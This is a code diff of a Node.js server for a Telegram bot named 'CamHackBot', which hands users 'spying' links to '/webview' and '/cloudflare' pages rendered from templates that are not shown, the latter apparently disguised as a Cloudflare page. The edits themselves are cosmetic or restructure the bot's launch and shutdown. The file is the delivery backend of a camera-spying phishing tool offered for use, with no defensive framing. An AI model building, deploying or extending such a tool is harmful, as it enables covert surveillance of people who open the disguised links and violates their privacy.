@@ -1,4 +1,4 @@
-const express = require('express');
+  const express = require('express');
 const { Telegraf } = require('telegraf');
 const path = require('path');
 const ejs = require('ejs');
@@ -7,34 +7,30 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ Get token securely from environment variable
 const BOT_TOKEN = process.env.BOT_TOKEN;
-
 if (!BOT_TOKEN) {
   console.error("❌ BOT_TOKEN is missing in environment variables!");
-  process.exit(1); // stop the server
+  process.exit(1);
 }
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// 👉 Bot command
+// Telegram Bot Commands
 bot.start((ctx) => {
   ctx.reply("👋 Welcome to CamHackBot!\n\nUse /webview or /cloudflare to get your spying link.");
 });
 
-// 👉 WebView link command
 bot.command("webview", (ctx) => {
   const link = `${process.env.URL || 'https://your-app-name.herokuapp.com'}/webview`;
   ctx.reply(`🔗 WebView link:\n${link}`);
 });
 
-// 👉 Cloudflare style link
 bot.command("cloudflare", (ctx) => {
   const link = `${process.env.URL || 'https://your-app-name.herokuapp.com'}/cloudflare`;
   ctx.reply(`🔗 Cloudflare style link:\n${link}`);
 });
 
-// Dummy data
+// Dummy Data
 const dummyData = {
   uid: 'abc123456',
   url: 'https://example.com',
@@ -44,7 +40,7 @@ const dummyData = {
   a: 'https://example.com/api'
 };
 
-// 👉 Render webview
+// EJS Render Routes
 app.get('/webview', (req, res) => {
   ejs.renderFile(path.join(__dirname, 'webview.ejs'), dummyData, {}, (err, str) => {
     if (err) return res.status(500).send(err.toString());
@@ -52,7 +48,6 @@ app.get('/webview', (req, res) => {
   });
 });
 
-// 👉 Render cloudflare
 app.get('/cloudflare', (req, res) => {
   ejs.renderFile(path.join(__dirname, 'cloudflare.ejs'), dummyData, {}, (err, str) => {
     if (err) return res.status(500).send(err.toString());
@@ -60,13 +55,26 @@ app.get('/cloudflare', (req, res) => {
   });
 });
 
-// Test route
 app.get('/', (req, res) => {
   res.send('✅ CamHackBot is live!');
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, async () => {
+app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  await bot.launch();
+});
+
+// 🧠 Separate launch to avoid conflict with Express
+bot.launch().then(() => {
+  console.log('🤖 Bot started successfully');
+});
+
+// Graceful shutdown to prevent "Event loop closed" error
+process.once('SIGINT', () => {
+  bot.stop('SIGINT');
+  process.exit(0);
+});
+process.once('SIGTERM', () => {
+  bot.stop('SIGTERM');
+  process.exit(0);
 });
